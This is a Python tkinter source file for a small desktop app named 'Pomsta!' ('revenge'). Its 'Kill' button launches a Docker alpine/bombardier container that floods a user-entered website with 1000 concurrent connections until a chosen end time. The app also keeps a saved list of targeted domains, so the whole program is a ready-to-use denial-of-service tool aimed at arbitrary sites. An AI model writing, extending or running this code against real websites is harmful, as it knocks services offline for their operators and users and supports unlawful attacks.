from tkinter import *
from tkinter.ttk import Progressbar
from tkinter.ttk import Combobox
from tkinter.font import Font
import json
import re
import datetime
import time
import _thread
import os

startTime = datetime.datetime.now().hour * 3600 + datetime.datetime.now().minute * 60 + datetime.datetime.now().second
currentTime = startTime

running = False

#-- ACTIONS ON 'KILL' BUTTON CLICKED --

def onButton1Click():

    button1['state'] = 'disabled'
    button2['state'] = 'normal'

    _thread.start_new_thread(onButton1ClickThread)

def onButton1ClickThread():

    global running, button1, button2

    running = True

    t = datetime.datetime.now()

    if (re.fullmatch(r'[a-z]+\.[a-z]{2,3}', comboBox1.get()) and endHour.get() * 3600 + endMin.get() * 60 > t.hour * 3600 + t.minute * 60):
        
        _thread.start_new_thread(lambda : os.system(f'docker run --name pomsta -ti --rm alpine/bombardier -c 1000 -d {(int(hourSB.get()) - t.hour) * 3600 + (int(minSB.get()) - t.minute) * 60}s -l https://{comboBox1.get()}'))
        
        root.title('Pomsta! - running')

        if (comboBox1.get() not in sites):
            
            sites.append(comboBox1.get())

            comboBox1['values'] = tuple(sites)
    
        with open(os.path.dirname(os.path.realpath(__file__)) + '\data.json', 'w') as json_file:

            json.dump(sites, json_file)

        startTime = datetime.datetime.now().hour * 3600 + datetime.datetime.now().minute * 60 + datetime.datetime.now().second
        currentTime = startTime

        while (currentTime < endHour.get() * 3600 + endMin.get() * 60 and running):
            
            currentTime = datetime.datetime.now().hour * 3600 + datetime.datetime.now().minute * 60 + datetime.datetime.now().second
        
            progress = (currentTime - startTime) * 100.0 / (endHour.get() * 3600 + endMin.get() * 60 - startTime)

            progressbar['value'] = progress

            root.update_idletasks()

            time.sleep(1)
        
        finishWork()
    
    _thread.exit()

#-- ACTIONS ON 'STOP' BUTTON CLICKED --

def onButton2Click():

    os.system('docker stop pomsta')

    global running
    
    running = False

    finishWork()

#-- FINISH WORK --

def finishWork():

    progressbar['value'] = 0

    button1['state'] = 'normal'
    button2['state'] = 'disabled'

    root.title('Pomsta!')

#-- INITIALIZE PROGRAM --

if (__name__ == '__main__'):

    global root, button1, button2, endHour, endMin, comboBox1, sites, progressbar, f

    sites = []

    root = Tk()

    f = Font(family='Andika', size=9)

    root.geometry('262x135')

    root.resizable(0, 0)

    root.configure(background = 'white')
    
    root.iconbitmap(os.path.dirname(os.path.realpath(__file__)) + '\ic_schedule_2022_logo.ico')

    root.title('Pomsta!')

    endHour = IntVar(value=0)
    endMin = IntVar(value=0)

    hourSB = Spinbox(

        root,
        from_ = 0,
        to = 23,
        textvariable = endHour,
        wrap=True,
        font = f

    )

    minSB = Spinbox(

        root,
        from_ = 0,
        to = 59,
        textvariable = endMin,
        wrap=True,
        font = f

    )

    label = Label(text = ':', bg = 'WHITE')

    progressbar = Progressbar(root, orient = HORIZONTAL, length = 100, mode = 'determinate')

    site = StringVar()

    comboBox1 = Combobox(root, textvariable = site, font = f)

    button1 = Button(text = 'Kill', relief = GROOVE, bg = 'WHITE', font = f, command = onButton1Click)

    button2 = Button(text = 'Stop', relief = GROOVE, bg = 'WHITE', font = f, command = onButton2Click)
    
    button2['state'] = 'disabled'
    
    try:
        with open(os.path.dirname(os.path.realpath(__file__)) + '\data.json', 'r') as f:
            sites = json.load(f)
            
    except: sites = []
    
    comboBox1['values'] = tuple(sites)

    hourSB.place(x = 12, y = 14, width = 40, height = 27)

    minSB.place(x = 78, y = 14, width = 40, height = 27)

    button1.place(x = 124, y = 12, width = 60, height = 31)

    button2.place(x = 190, y = 12, width = 60, height = 31)

    label.place(x = 58, y = 16, width = 14, height = 23)

    progressbar.place(x = 12, y = 51, width = 238, height = 31)

    comboBox1.place(x = 12, y = 92, width = 238, height = 31)
    
    root.mainloop()